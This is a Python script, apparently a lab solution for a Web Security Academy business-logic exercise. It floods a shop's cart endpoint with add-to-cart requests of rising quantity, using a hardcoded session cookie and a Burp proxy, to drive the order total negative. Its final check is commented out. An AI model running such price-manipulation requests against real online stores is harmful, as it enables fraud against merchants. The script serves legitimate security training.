import requests, signal, sys, string, time, base64
from bs4 import BeautifulSoup
from pwn import *

#Variables Globales
URL = "https://0a9200e604ca4af3c19e99a0008c00a9.web-security-academy.net/cart"

def def_handler(sig, frame):
    print("\n[+] Saliendo...")
    exit(1)
signal.signal(signal.SIGINT, def_handler)

def makeRequest(payload):
    proxy = {'http':'127.0.0.1:8080', 'https':'127.0.0.1:8080'}
    dataPost = {"productId": "1", "quantity": "%i" % payload, "redir": "CART"}
    header = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/110.0", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8", "Accept-Language": "es-ES,es;q=0.8,en-US;q=0.5,en;q=0.3", "Accept-Encoding": "gzip, deflate", "Content-Type": "application/x-www-form-urlencoded", "Origin": "https://0a5f00ba045419c2c496298a00b90086.web-security-academy.net", "Dnt": "1", "Referer": "https://0a5f00ba045419c2c496298a00b90086.web-security-academy.net/cart", "Upgrade-Insecure-Requests": "1", "Sec-Fetch-Dest": "document", "Sec-Fetch-Mode": "navigate", "Sec-Fetch-Site": "same-origin", "Sec-Fetch-User": "?1", "Te": "trailers", "Connection": "close"}
    cookie = {"session":"PSlvfos8za2jFpA3h7IxKdwH0pB4yAyP"}
    r = requests.post(proxies = proxy, url=URL, headers = header, data = dataPost, cookies=cookie,verify=False)
    return r

if __name__ == "__main__":

    for i in range(99):
        r = makeRequest(i)
        #print(r.content)
        soup = BeautifulSoup(r.text, "html.parser")
        dinero = soup.find_all("th")
        #dinero_fin = float(dinero[5].string.replace("$", ""))
        #print(dinero.string.replace("$", ""))

        #if dinero_fin < -1337:
        #    print("stop")
        #    break

        
